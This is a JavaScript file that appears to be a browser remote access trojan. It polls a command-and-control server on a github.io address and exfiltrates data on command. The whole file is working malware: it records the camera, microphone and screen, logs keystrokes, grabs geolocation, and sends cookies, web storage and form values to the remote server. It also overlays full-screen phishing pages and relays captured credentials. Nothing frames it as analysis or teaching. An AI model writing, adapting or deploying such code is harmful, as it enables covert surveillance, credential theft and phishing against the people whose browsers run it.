(function() {
    // Configuration
    const c2Server = "https://sijanxaura.github.io/Controlling-infected-device/";
    let deviceId = localStorage.getItem('ratDeviceId') || generateDeviceId();
    localStorage.setItem('ratDeviceId', deviceId);
    
    // Device information collection
    const deviceInfo = {
        deviceId: deviceId,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookieEnabled: navigator.cookieEnabled,
        onLine: navigator.onLine,
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth
        },
        window: {
            width: window.innerWidth,
            height: window.innerHeight
        },
        location: window.location.href,
        timestamp: new Date().toISOString()
    };
    
    // Register with C2 server
    registerDevice();
    
    // Start command polling
    setInterval(checkForCommands, 5000);
    
    // Functions
    function generateDeviceId() {
        return 'device_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    }
    
    function registerDevice() {
        fetch(`${c2Server}/register`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(deviceInfo)
        })
        .then(response => response.json())
        .then(data => console.log('Registered with C2:', data))
        .catch(error => console.error('Registration error:', error));
    }
    
    function checkForCommands() {
        fetch(`${c2Server}/commands/\${deviceId}`)
            .then(response => response.json())
            .then(commands => {
                if (commands && commands.length > 0) {
                    commands.forEach(cmd => executeCommand(cmd));
                }
            })
            .catch(error => console.error('Command check error:', error));
    }
    
    function executeCommand(command) {
        console.log('Executing command:', command.type);
        
        switch(command.type) {
            case 'camera':
                accessCamera(command.duration || 10000);
                break;
            case 'screen':
                accessScreen(command.duration || 10000);
                break;
            case 'location':
                getLocation();
                break;
            case 'screenshot':
                takeScreenshot();
                break;
            case 'keylog':
                startKeylogger(command.duration || 60000);
                break;
            case 'exfil':
                exfiltrateData(command.target);
                break;
            case 'phish':
                showPhishingPage(command.url);
                break;
            default:
                console.log('Unknown command type:', command.type);
        }
    }
    
    function accessCamera(duration) {
        // Request camera access
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(stream => {
                console.log('Camera access granted');
                
                // Create video element to capture stream
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                // Send stream to C2
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        chunks.push(event.data);
                    }
                };
                
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { 'type' : 'video/webm' });
                    sendBlobToC2(blob, 'camera');
                };
                
                mediaRecorder.start();
                
                // Stop recording after duration
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, duration);
            })
            .catch(error => {
                console.error('Camera access denied:', error);
                sendErrorToC2('Camera access denied: ' + error.message);
            });
    }
    
    function accessScreen(duration) {
        // Request screen sharing
        navigator.mediaDevices.getDisplayMedia({ video: true, audio: true })
            .then(stream => {
                console.log('Screen access granted');
                
                // Send stream to C2
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        chunks.push(event.data);
                    }
                };
                
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { 'type' : 'video/webm' });
                    sendBlobToC2(blob, 'screen');
                };
                
                mediaRecorder.start();
                
                // Stop recording after duration
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, duration);
            })
            .catch(error => {
                console.error('Screen access denied:', error);
                sendErrorToC2('Screen access denied: ' + error.message);
            });
    }
    
    function takeScreenshot() {
        // Use html2canvas library (you would need to include it)
        if (typeof html2canvas === 'function') {
            html2canvas(document.body).then(canvas => {
                canvas.toBlob(blob => {
                    sendBlobToC2(blob, 'screenshot');
                });
            });
        } else {
            // Alternative method using Screen Capture API
            navigator.mediaDevices.getDisplayMedia({ video: true })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        canvas.toBlob(blob => {
                            sendBlobToC2(blob, 'screenshot');
                        });
                        
                        stream.getTracks().forEach(track => track.stop());
                    }, 1000);
                })
                .catch(error => {
                    console.error('Screenshot failed:', error);
                    sendErrorToC2('Screenshot failed: ' + error.message);
                });
        }
    }
    
    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                position => {
                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date().toISOString()
                    };
                    sendDataToC2(locationData, 'location');
                },
                error => {
                    console.error('Location access denied:', error);
                    sendErrorToC2('Location access denied: ' + error.message);
                }
            );
        } else {
            sendErrorToC2('Geolocation not supported');
        }
    }
    
    function startKeylogger(duration) {
        const keys = [];
        const originalHandler = document.onkeypress;
        
        document.onkeypress = function(e) {
            keys.push({
                key: e.key,
                timestamp: new Date().toISOString()
            });
            
            // Call original handler if it existed
            if (originalHandler) originalHandler(e);
        };
        
        // Stop keylogging after duration
        setTimeout(() => {
            document.onkeypress = originalHandler;
            sendDataToC2(keys, 'keystrokes');
        }, duration);
    }
    
    function exfiltrateData(target) {
        let data = {};
        
        switch(target) {
            case 'cookies':
                data = document.cookie.split(';').reduce((res, item) => {
                    const [key, val] = item.trim().split('=');
                    res[key] = val;
                    return res;
                }, {});
                break;
            case 'localStorage':
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    data[key] = localStorage.getItem(key);
                }
                break;
            case 'sessionStorage':
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    data[key] = sessionStorage.getItem(key);
                }
                break;
            case 'forms':
                data = Array.from(document.querySelectorAll('form')).map(form => {
                    return {
                        action: form.action,
                        method: form.method,
                        fields: Array.from(form.querySelectorAll('input, select, textarea')).map(field => {
                            return {
                                name: field.name,
                                type: field.type,
                                value: field.value
                            };
                        })
                    };
                });
                break;
        }
        
        sendDataToC2(data, 'exfil_' + target);
    }
    
    function showPhishingPage(url) {
        // Create a full-screen iframe to show phishing page
        const iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.style.position = 'fixed';
        iframe.style.top = '0';
        iframe.style.left = '0';
        iframe.style.width = '100%';
        iframe.style.height = '100%';
        iframe.style.border = 'none';
        iframe.style.zIndex = '999999';
        
        document.body.appendChild(iframe);
        
        // Listen for messages from the iframe
        window.addEventListener('message', (event) => {
            if (event.data.type === 'phish_creds') {
                sendDataToC2(event.data.credentials, 'phishing');
            }
        });
    }
    
    function sendDataToC2(data, dataType) {
        fetch(`${c2Server}/data/${deviceId}`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                type: dataType,
                data: data,
                timestamp: new Date().toISOString()
            })
        })
        .then(response => response.json())
        .then(result => console.log('Data sent to C2:', result))
        .catch(error => console.error('Error sending data:', error));
    }
    
    function sendBlobToC2(blob, dataType) {
        const formData = new FormData();
        formData.append('deviceId', deviceId);
        formData.append('type', dataType);
        formData.append('timestamp', new Date().toISOString());
        formData.append('data', blob, `${dataType}_${Date.now()}.webm`);
        
        fetch(`${c2Server}/blob/${deviceId}`, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(result => console.log('Blob sent to C2:', result))
        .catch(error => console.error('Error sending blob:', error));
    }
    
    function sendErrorToC2(error) {
        sendDataToC2({error: error}, 'error');
    }
})();
       